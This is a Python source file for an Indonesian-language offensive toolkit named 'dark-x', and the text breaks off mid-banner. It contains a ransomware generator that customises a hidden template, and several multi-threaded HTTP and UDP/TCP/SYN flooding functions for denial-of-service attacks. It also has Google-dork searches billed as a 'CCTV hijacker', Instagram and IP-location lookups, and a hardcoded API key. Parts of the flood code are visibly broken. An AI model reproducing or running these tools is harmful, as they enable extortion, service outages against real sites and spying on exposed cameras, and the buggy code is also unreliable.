# Ngapain dek?
# Mau recode? Boleh asalkan hargai & cantumkan author asli
# -------------------------------------------------
# Thanks to       : Allah
# Author/Penyusun : Shadow Xploit
# Tool            : dark-x
# Version         : 3.3
# Last Update     : 05-06-2024
# -------------------------------------------------

import useragent, os, sys, time, platform, requests, re, json, urllib, colorama, instaloader, random, socket, threading, cloudscraper
import requests as r
from time import sleep
from time import sleep
from datetime import datetime
from instaloader import instaloader
from colorama import Fore, Style, init
from requests.sessions import session
from sqlite3 import Time
from scapy.all import *

def ransomware():
    # Membuka file dengan mode read dan write
    os.system("cp .data/.t.py .")
    new_ransomware = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama Ransomware \033[1;31m(ex. fb.py) \033[1;36m: \033[0;37m")
    os.system(f"mv .t.py {new_ransomware}")
    file_name = new_ransomware
    with open(file_name, 'r') as file:
        data = file.read()
    new_name = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNickname anda \033[1;36m: \033[0;37m")
    new_address = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPassword ransomware \033[1;36m: \033[0;37m")
    new_number = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNomor anda \033[1;31m(+62xxx) \033[1;36m: \033[0;37m")
    data = data.replace("Nick777x", new_name)
    data = data.replace("111", new_address)
    data = data.replace("+6283141494320", new_number)
    data = data.replace("deface.py", new_ransomware)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system(f"mv {new_ransomware} /sdcard")
    time.sleep(1)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMembuat ransomware...")
    time.sleep(1.5)
    print(f"\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCek file ransomware \033[0;37m'{new_ransomware}' \033[1;34mdi memori internal!")
    time.sleep(0.5)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJangan lupa di enkripsi, biar passwordnya gak kebaca!")
    time.sleep(0.5)

def httpv1():
    import threading
    from colorama import Fore, Style, init
    init()

    def stress_test(url):
        num_threads = int(input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequests/second \033[1;31m(ex. 100) \033[1;36m: \033[0;37m"))
        requests_per_second = int(input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThreads \033[1;31m(ex. 100) \033[1;36m: \033[0;37m"))
        def send_requests():
            requests_sent = 0
            session = requests.Session()
            try:
                while not stop_event.is_set():
                    session.get(url)
                    requests_sent += 1
                    print(f" \033[1;34mThread-{threading.current_thread().ident} Request {requests_sent} Berhasil" + Style.RESET_ALL)
                    time.sleep(1 / requests_per_second)
            except Exception as e:
                print(f" \033[1;31mThread-{threading.current_thread().ident} encountered an error: {e}")
            except KeyboardInterrupt:
                print(" \033[1;31mExiting...")
                stop_event.set()
        stop_event = threading.Event()
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=send_requests)
            thread.start()
            threads.append(thread)
        try:
            print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPress Ctr+Z to stop the attack\n")
            #Check result on https://check-host.net/check-http?host={url}\n")
        except KeyboardInterrupt:
            print(" \033[1;31mExiting...")
            stop_event.set()
        for thread in threads:
            thread.join()
    if __name__ == "__main__":
        url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
        if url.endswith("id"):
           time.sleep(1)
           print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
           time.sleep(0.5)
           sys.exit()
        else:
           stress_test(url)

def httpv3():
    import threading
    def send_request(url):
        with open('user-agents.txt', 'r') as f:
            useragents = f.readlines()
        while True:
            try:
                # Select a random user agent from the list
                user_agent = random.choice(useragents).strip()

                # Set the user agent header
                headers = {'User-Agent': user_agent}

                response = requests.get(url, headers=headers)
                print(" \033[1;34mRespon status web :", (response.status_code))
            except requests.exceptions.RequestException as e:
                print(" \033[1;31mError :", e)

    if __name__ == "__main__":
        url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
        if url.endswith("id"):
            time.sleep(1)
            print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
            time.sleep(0.5)
            sys.exit()
        else:
            proxy_list = open('proxy.txt', 'r').readlines()

            proxies = {'http': None, 'https': None}

            for proxy in proxy_list:
                proxies['http'] = 'http://' + proxy.strip()
                proxies['https'] = 'https://' + proxy.strip()

                for i in range(500):
                    threading.Thread(target=send_request, args=(url,)).start()

def layer4():
    fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
    global ua
    ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')

    logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              Simple C2 Saturns
                   V : 1.2
              MADE BY : MrSanZz
             TEAM  : JogjaXploit
"""
    print(Fore.LIGHTMAGENTA_EX + logo)
    try:
        ip = input(f"\033[1;37mIP Target          : ")
        port = int(input("Port (ex.443)      : "))
        bytes = int(input("Bytes/Sec (ex.100) : "))
        thrs = int(input("Thread (ex.100)    : "))
        bost = input("Use Boost ? y/n    : ")
        if os.name == "posix":
            os.system('clear')
        elif os.name == "nt":
            os.system('cls')
        if bost == 'y':
            bytes = bytes + 500
        else:
            bytes = bytes
        print(Fore.LIGHTMAGENTA_EX + logo)
        print(Fore.LIGHTWHITE_EX+"Attack Status : ")
        print("╔═════════════════")
        print(f"║ IP    : {ip}   ")
        print(f"║ Port  : {port} ")
        print(f"║ BPS   : {bytes}")
        print(f"║ Thrds : {thrs} ")
        print(f"║ Boost : {bost} ")
        print(f"║ Bot   : {bytes} ")
        print("╚═════════════════")
        def c2():
            for fk in fake:
                try:
                    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
                    byte = random._urandom(60000)
                    sent = 5000
                    s1.sendto(byte, (ip,port))
                    for i in range(bytes):
                        s1.sendto(byte, (ip,port))
                        s1.sendto(byte, (ip,port))
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #HTTP
                    s2.connect((ip,port))
                    s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"), (ip,port))
                    s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"), (ip,port))
                    s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode("utf-8"), (ip,port))
                    s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"), (ip,port))
                    s2.send(byte)
                    s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW) #TLS
                    s3.connect((ip,port))
                    s3.send((byte))
                    fuck = IP(dst=ip) #TCP
                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
                    raw = Raw(b"X"*60000)
                    p = ip / tcp / raw
                    send(p, loop=bytes, verbose=0)
                    scraper = cloudscraper.create_scraper()
                    scraper.get(ip, timeout=thrs)
                    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    byte = random._urandom(65000)
                    tip = tuple(ip)
                    udp.sendto(byte, (ip,port))
                    http.connect((ip,port))
                    msg = {
                        "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
                        "User-Agent: "+random.choice(ua)+"\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                        "Connection: Keep-Alive\r\n\r\n"
                    }
                    tls.connect((ip,port))
                    tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                    session = requests.session()
                    scraper = cloudscraper.create_scraper(sess=session)
                    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                    for i in range(bytes):
                        udp.sendto(byte, (ip,port))
                        udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                        http.sendto(byte, (ip,port))
                        tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                        pack = "SYN\x00"
                        pack_len = len(pack)
                        tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                        tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                        tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                        tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                        tcp.send(tcp_packet, (ip,port))
                        scraper.get(ip, timeout=thrs)
                        scraper = cloudscraper.create_scraper(server_hostname=fk)
                        scraper.get(
                            ip,
                            headers={'Host': fk}
                        )
                except OSError:
                    continue
                except TypeError:
                    continue
                except socket.gaierror:
                    print(Fore.LIGHTRED_EX+"[!] Fail get target info, did you type the target correct? [!]"    )
                    exit()
                except TimeoutError:
                    print("\n")
                    print(Fore.LIGHTRED_EX+"TARGET IS DOWN ! ")
                except KeyboardInterrupt:
                    exit("Exiting..\n")
                except:
                    print(Fore.LIGHTMAGENTA_EX+"[ C2 ] INFO : SUCCESSFULLY FLOODING TARGET <3 [ C2 ]")
                    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
                    byte = random._urandom(60000)
                    sent = 5000
                    s1.sendto(byte, (ip,port))
                    for i in range(bytes):
                        s1.sendto(byte, (ip,port))
                        s1.sendto(byte, (ip,port))
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #HTTP
                    s2.connect((ip,port))
                    s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"), (ip,port))
                    s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"), (ip,port))
                    s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode("utf-8"), (ip,port))
                    s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"), (ip,port))
                    s2.send(byte)
                    s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW) #TLS
                    s3.connect((ip,port))
                    s3.send((byte))
                    fuck = IP(dst=ip) #TCP
                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
                    raw = Raw(b"X"*60000)
                    p = ip / tcp / raw
                    send(p, loop=bytes, verbose=0)
                    scraper = cloudscraper.create_scraper()
                    scraper.get(ip, timeout=thrs)
                    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    byte = random._urandom(65000)
                    tip = tuple(ip)
                    udp.sendto(byte, (ip,port))
                    http.connect((ip,port))
                    msg = {
                        "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
                        "User-Agent: "+random.choice(ua)+"\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                        "Connection: Keep-Alive\r\n\r\n"
                    }
                    tls.connect((ip,port))
                    tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                    session = requests.session()
                    scraper = cloudscraper.create_scraper(sess=session)
                    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                    for i in range(bytes):
                        udp.sendto(byte, (ip,port))
                        udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                        http.sendto(byte, (ip,port))
                        tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                        pack = "SYN\x00"
                        pack_len = len(pack)
                        tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                        tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                        tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                        tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                        tcp.send(tcp_packet, (ip,port))
                        scraper.get(ip, timeout=thrs)
                        scraper = cloudscraper.create_scraper(server_hostname=fk)
                        scraper.get(
                            ip,
                            headers={'Host': fk}
                        )
        for i in range(thrs):
            threads = threading.Thread(target=c2)
            threads.start()
    except ValueError:
        exit("Did you fill the target info correctly? please retry!\n")
    except KeyboardInterrupt:
        exit("Exiting..\n")

def ig():
  RED = "\033[91m"
  GREEN = "\033[92m"
  BLUE = "\033[94m"
  YELLOW = "\033[1;93m"
  WHITE = "\033[1;97m"
  NORMAL = "\033[0;37m"
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  YE = '\033[1;33m'
  BOLD = '\033[1m'
  ENDC = '\033[0m'
  CRED2 = "\33[91m"
  CBLUE2 = "\33[94m"
  ENDC = "\033[0m"
  now = datetime.now()
  current_time = now.strftime("%H:%M:%S")
  ### banner
  def banner():
              print (f"""{OKGREEN}    __________   ____  _____ _____   ________
   /  _/ ____/  / __ \/ ___//  _/ | / /_  __/
   / // / __   / / / /\__ \ / //  |/ / / /
 _/ // /_/ /  / /_/ /___/ // // /|  / / /
/___/\____/   \____//____/___/_/ |_/ /_/

{OKGREEN}Version 1.2 - 2024 coded by Mr,OwlBird05""")
  def start():
     banner()
     import instaloader, sys
     from instaloader import instaloader
     x = instaloader.Instaloader()
     try:
        print ()
        sleep(1)
        uname = input(f"\033[32mEnter a username instagram {CRED2}: \033[37m") #INPUT USER
        if uname == "":
           print("\033[1;31mUsername tidak ditemukan!\n")
           sys.exit()


        f = instaloader.Profile.from_username(x.context,uname)

        print("\033[32mUsername\033[0m :", f.username)
        print("\033[32mID\033[0m :", f.userid)
        print("\033[32mNama lengkap\033[0m :", f.full_name)
        print("\033[32mBiografi\033[0m :", f.biography)
        print("\033[32mNama kategori bisnis\033[0m :", f.business_category_name)
        print("\033[32mURL eksternal\033[0m :", f.external_url)
        print("\033[32mDiikuti orang\033[0m :", f.followed_by_viewer)
        print("\033[32mMengikuti\033[0m :", f.followees) 
        print("\033[32mPengikut\033[0m :", f.followers)
        print("\033[32mMengikuti orang\033[0m :", f.follows_viewer)
        print("\033[32mDiblokir orang\033[0m :", f.blocked_by_viewer)
        print("\033[32mPernah memblokir orang\033[0m :", f.has_blocked_viewer)
        print("\033[32mPunya sorotan\033[0m :", f.has_highlight_reels)
        print("\033[32mPunya cerita publik\033[0m :", f.has_public_story)
        print("\033[32mTelah meminta orang\033[0m :", f.has_requested_viewer)
        print("\033[32mDiminta orang\033[0m :", f.requested_by_viewer)
        print("\033[32mMemiliki cerita yang dapat dilihat\033[0m :", f.has_viewable_story)
        print("\033[32mIGTV\033[0m :", f.igtvcount)
        print("\033[32mAkun bisnis\033[0m :", f.is_business_account)
        print("\033[32mAkun pribadi\033[0m :", f.is_private)
        print("\033[32mDiverifikasi\033[0m :", f.is_verified)
        print("\033[32mPostingan\033[0m :", f.mediacount)
        print("\033[32mURL foto profil\033[0m :", f.profile_pic_url)
        print ()

     except KeyboardInterrupt:
        print("")

     except EOFError:
        print("")
  start()

def ip_track():
    RED = "\033[91m"
    GREEN = "\033[92m"
    BLUE = "\033[94m"
    YELLOW = "\033[1;93m"
    WHITE = "\033[1;97m"
    NORMAL = "\033[0;37m"
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    YE = '\033[1;33m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    CRED2 = "\33[91m"
    CBLUE2 = "\33[94m"
    ENDC = "\033[0m"
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    print("""\033[1;93m    ________     ____  _____ _____   ________
   /  _/ __ \   / __ \/ ___//  _/ | / /_  __/
   / // /_/ /  / / / /\__ \ / //  |/ / / /
 _/ // ____/  / /_/ /___/ // // /|  / / /
/___/_/       \____//____/___/_/ |_/ /_/

Coded By Mr OwlBird05 x Shadow Xploit""")
    sleep(1)
    ip = input(f"{WHITE}\nEnter IP/Domain target {CRED2}: {YELLOW}")
    print()
    print(f'{NORMAL}============= {YELLOW}SHOW INFORMATION IP ADDRESS {NORMAL}=============')
    req_api = requests.get(f"https://dikaardnt.com/api/ip/{ip}")
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f"{NORMAL}\nIP Target     :{YELLOW}", ip_data["query"])
    sleep(0.1)
    print(f"{NORMAL}ZIP           :{YELLOW}", ip_data["zip"])
    sleep(0.1)
    print(f"{NORMAL}Country       :{YELLOW}", ip_data["country"])
    sleep(0.1)
    print(f"{NORMAL}Country Code  :{YELLOW}", ip_data["countryCode"])
    sleep(0.1)
    print(f"{NORMAL}City          :{YELLOW}", ip_data["city"])
    sleep(0.1)
    print(f"{NORMAL}Region        :{YELLOW}", ip_data["regionName"])
    sleep(0.1)
    print(f"{NORMAL}Region Code   :{YELLOW}", ip_data["region"])
    sleep(0.1)
    print(f"{NORMAL}Latitude      :{YELLOW}", ip_data["lat"])
    sleep(0.1)
    print(f"{NORMAL}Longitude     :{YELLOW}", ip_data["lon"])
    sleep(0.1)
    print(f"{NORMAL}Time Zone     :{YELLOW}", ip_data["timezone"])
    sleep(0.1)
    print(f"{NORMAL}Date Time     :{YELLOW}", ip_data["datetime"])
    sleep(0.1)
    print(f"{NORMAL}ISP           :{YELLOW}", ip_data["isp"])
    sleep(0.1)
    print(f"{NORMAL}ORG           :{YELLOW}", ip_data["org"])
    sleep(0.1)
    print(f"{NORMAL}Capital       :{YELLOW}", ip_data["as"])
    sleep(0.1)
    lat = (ip_data['lat'])
    lon = (ip_data['lon'])
    print(f"{NORMAL}Maps          :{YELLOW}",f"https://www.google.com/maps/place/{lat},{lon}/@{lat},{lon},17z")
    sleep(0.1)
    print(f"{NORMAL}Address       :{YELLOW}", ip_data["address"])
    print ()

def shadow_gpt():
    import shutil
    from rich.panel import Panel
    from rich import print as rprint
    from rich.prompt import Prompt
    from colorama import Fore as f
    
    now = datetime.now()

    tahun = now.year
    bulan = now.month
    tanggal = now.strftime("%d")
    hari_angka = now.weekday()
    if hari_angka == 0:
        hari_nama = "Senin"
    elif hari_angka == 1:
        hari_nama = "Selasa"
    elif hari_angka == 2:
        hari_nama = "Rabu"
    elif hari_angka == 3:
        hari_nama = "Kamis"
    elif hari_angka == 4:
        hari_nama = "Jumat"
    elif hari_angka == 5:
        hari_nama = "Sabtu"
    else:
        hari_nama = "Minggu"

    jam = now.hour
    menit = now.minute
    detik_awal = now.second

    url = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=AIzaSyALD_4lMsLnqlvXb3aOtLQ-eeYs6rhTaAY'

    headers = {'Content-Type': 'application/json'}

    print("""\033[1;34m   _____ __              __              __________  ______
  / ___// /_  ____ _____/ /___ _      __/ ____/ __ \/_  __/
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / / __/ /_/ / / /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /_/ / ____/ / /
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/_/     /_/
""")

    while True:
      try:
        input_text = Prompt.ask("\033[1;34mPertanyaan \033[0;37m")
        data = {
            "contents": [
                {
                    "parts": [
                        {
                            "text": input_text
                        }
                    ]
                }
            ]
        }

        detik_awal = now.second
        response = requests.post(url, headers=headers, json=data)
        result = response.json()
        detik_akhir = datetime.now().second

        for candidate in result['candidates']:
            content = candidate['content']
            if 'parts' in content:
                for part in content['parts']:
                    if 'text' in part:
                        reply_text = part['text']
                        print()
                        print(f"\033[1;34mShadow GPT \033[0;37m: {reply_text}")
                        #rprint(Panel(reply_text, title="[bold red]SHADOW GPT[/bold red]", style="white"))
                        print(f"\n\033[1;31m Waktu Respon: {tahun}/{bulan}/{tanggal}/{hari_nama}/{jam}:{menit}:{detik_akhir} - By Shadow GPT")
                        os.system(f'espeak -s 190 -a 200 -p 5 -g 5 "{reply_text}" -v id+f10')
                        break
        print()
      except KeyError:
        print("\033[1;31m[\033[1;37m!\033[1;31m] \033[1;31mKesalahan tak terduga!")
        break
      except KeyboardInterrupt:
        print("\033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan!")
        break

def termux_banner():
    # Membuka file dengan mode read dan write
    os.system("cp .data/.sh .")
    file_name = '.sh'
    with open(file_name, 'r') as file:
        data = file.read()
    new_name = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNama \033[1;31m(ex. Shadow Xploit) \033[1;36m: \033[0;37m")
    new_address = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKomunitas \033[1;31m(ex. D A R K  X P L O I T E R) \033[1;36m: \033[0;37m")
    data = data.replace("dark", new_name)
    data = data.replace("D A R K  X P L O I T E R", new_address)
    with open(file_name, 'w') as file:
        file.write(data)
    os.system("mv .sh $HOME/../usr/etc/bash.bashrc")
    time.sleep(1)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mSelesai")
    time.sleep(0.5)
    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKetik \033[1;31mlogin \033[1;34muntuk mencoba!")

def cctv():
    from googlesearch import search
    import ipaddress
    import faker
    from faker import Faker
    global user_ip
    user_ip = Faker()
    ip_addr = user_ip.ipv4()
    ip_address = user_ip.ipv6()
    MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
    MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
    def randomipv4():
        return  ipaddress.IPv4Address._string_from_ip_int(
            random.randint(0, MAX_IPV4)
        )

    def randomipv6():
        return ipaddress.IPv6Address._string_from_ip_int(
            random.randint(0, MAX_IPV6)
        )
    random.seed(444)
    randomipv4()
    '79.19.184.109'
    randomipv4()
    '3.99.136.189'
    randomipv4()
    '124.4.25.53'
    randomipv6()
    '4fb7:270d:8ba9:c1ed:7124:317:e6be:81f2'
    randomipv6()
    'fe02:b348:9465:dc65:6998:6627:1300:29c9'
    randomipv6()
    '74a:dd88:1ff2:bfe3:1f3:81ad:debd:db88'    
    address = randomipv4()
    ip6 = randomipv6()

    global user_agents
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
    global success, info, fail
    success, info, fail = Fore.WHITE, Fore.BLUE, Fore.RED
    
    if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
        os.system('clear')
    elif os.name == 'nt':   # Untuk sistem Windows
        os.system('cls')

    print("""\033[1;34m  _________________   __  __ ___   _          __  
 / ___/ ___/_  __/ | / / / // (_) (_)__ _____/ /_____ ____
/ /__/ /__  / /  | |/ / / _  / / / / _ `/ __/  '_/ -_) __/
\___/\___/ /_/   |___/ /_//_/_/_/ /\_,_/\__/_/\_\\__/_/ 
                             |___/ \033[1;31mBy MrSanZz""")
    lokasi = input(f'\033[1;34mLokasi/Daerah \033[1;31m: \033[0;37m')
    dork = ['inurl ', 'intext ', 'intitle ', 'cgi ', 'view.shtml']
    dorkc = ['/view.shtml', 'cctv', 'CgiStart?page=', 'liveapplet', 'Webcam.html', 'EvoCam', 'view/view.shtml', 'cctv/view.shtml', 'cctv/index.shtml', 'cctv/index.php', 'cctv/index.html']
    
    for cctv in dork:
            try:
                rand_user = random.choice(user_agents)
                rand_ipv4 = random.choice(address)
                rand_ipv6 = random.choice(ip6)    
                print(f'\033[1;34mSearching CCTV...')    
                for hijacked in search(f'{cctv}cctv {cctv}{lokasi}', tld='com', num=1, start=1, stop=None, pause=4):
                    print(f'\033[0;37mFound : ')
                    print(hijacked)
                else:
                    print(f'\033[1;31mCant find')
            except urllib.error.HTTPError as e:
                    if e.code == 429:
                        print(f'\033[1;31m[429] Too Many Request, Please Wait')
                        time.sleep(4)
    print('\033[1;33mCCTV Hijacker Done')                
def cctv2():
    from requests.structures import CaseInsensitiveDict
    colorama.init()

    url = "http://www.insecam.org/en/jsoncountries/"

    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Cache-Control"] = "max-age=0"
    headers["Connection"] = "keep-alive"
    headers["Host"] = "www.insecam.org"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"


    resp = requests.get(url, headers=headers)

    data = resp.json()
    countries = data['countries']

    print("""\033[1;31m  _________________   __  __ ___   _          __  
